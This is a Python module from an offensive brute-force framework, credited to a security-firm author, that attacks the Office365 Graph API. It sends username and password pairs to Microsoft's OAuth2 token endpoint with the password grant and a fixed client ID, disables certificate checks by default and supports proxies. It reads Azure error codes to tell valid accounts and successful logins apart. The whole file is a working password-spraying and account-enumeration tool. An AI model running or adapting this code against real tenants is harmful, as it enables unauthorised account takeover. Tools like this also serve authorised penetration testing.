import re
import inspect
from bfg.data import loadAzureSSOSoap
from bfg.args import http as http_args
from requests import Session
from bfg.shortcuts.http import HTTPModule, handleUA
from bfg.shortcuts.azure_errors import *
from requests.exceptions import ConnectionError

MSONLINE_URL    = 'https://login.microsoftonline.com'
MSONLINE_NETLOC = 'login.microsoftonline.com'
O365_URL        = 'https://outlook.office365.com'
AUTH_PATH       = '/common/oauth2/token'

def strip_slash(s):

    if s and s[-1] == '/':
        s=s[:len(s)-1]

    return s

class Session(Session):

    def __init__(self, url, headers=None, allow_redirects=True,
            verify_ssl=False, *args, **kwargs):

        super().__init__(*args, **kwargs)

        # Configure redirects
        self.allow_redirects=allow_redirects

        # using the setattr builtin here because requests.Session
        # doesn't care for new instance variables beinga assigned
        setattr(self,'verify_ssl',verify_ssl)

        # Update MSOL URL
        self.url = strip_slash(url)

        # Update headers
        headers = headers if headers else {}
        headers['Accept']='application/json'
        self.headers.update(headers)

    def authenticate(self,username,password):
        '''Authenticate the credentials via the Graph API.
        '''

        credential = f'{username}:{password}'

        # Create the POST data
        data = {'resource':'https://graph.windows.net',
            'client_id':'1b730954-1685-4b74-9bfd-dac224a7b894',
            'client_info':'1',
            'grant_type':'password',
            'username':username,
            'password':password,
            'scope':'openid'}

        # Make the post request
        resp = self.post(self.url+AUTH_PATH,
                data=data,
                allow_redirects=self.allow_redirects,
                verify=self.verify_ssl)

        # Search the response for error codes
        error_code = re.search(ERROR_CODE_RE, resp.text)
        if error_code:

            error_code = error_code.groups()[0]
            outcome, username_valid, events = \
                lookupCode(resp.status_code, error_code)

            if events:
                events[0] += f' - {credential}'

            return outcome, username_valid, events

        else:

            if resp.status_code == 200:
                return 1, True, ['200 OK response']
            else:
                return -1, True, ['Unhandled response event occurred']

def url():

    return http_args.url(
        name_or_flags=('--url',),
        required=False,
        default=MSONLINE_URL,
        help='Microsoft Online URL to target. Default: %(default)s')

class Module(HTTPModule):

    name = 'http.o365_graph'

    brief_description = 'Office365 Graph API'

    description = 'Brute force the Office365 Graph API.'

    args = [url()]+http_args.getDefaults('url', invert=True)

    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    references = []

    @handleUA 
    def __call__(self, username, password, *args, **kwargs):
        '''Proxy the call request up to the Session object to perform
        authentication.
        '''

        session = Session(url=self.url,
                headers=self.headers,
                verify_ssl=self.verify_ssl,
                allow_redirects=self.allow_redirects)

        if self.proxies:
            session.proxies.update(self.proxies)

        try:

            outcome, valid_account, events = \
                session.authenticate(username, password)

        except ConnectionError:

            return dict(
                outcome=-1,
                username=username,
                password=password,
                events=['Connection timed out'])

        events = events if events else []

        return dict(outcome=outcome,
                username=username,
                password=password,
                actionable=valid_account,
                events=events)




